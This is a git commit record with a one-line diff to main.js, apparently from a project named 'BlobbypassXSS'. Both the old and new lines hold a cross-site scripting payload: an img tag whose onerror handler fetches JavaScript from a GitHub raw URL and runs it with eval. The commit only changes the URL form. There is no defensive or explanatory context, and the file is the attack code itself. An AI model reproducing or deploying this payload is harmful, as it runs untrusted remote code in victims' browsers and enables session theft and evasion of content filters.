6ea634bcdc751b55c28583a13ee3a40d8511b5d4
Bronah1335 <bradleyjasper80@gmail.com>
2025-04-02 09:13:13 -0400

    Update main.js

--- main.js
+++ main.js
@@ -1,1 +1,1 @@
-window.location.href="<img src=# onerror='fetch("https://raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>"
+window.location.href="<img src=# onerror='fetch("raw.githubusercontent.com/Blobby-Boi/BlobbypassXSS/main/main.js").then(r=>r.text()).then(c=>eval(c)) '>"
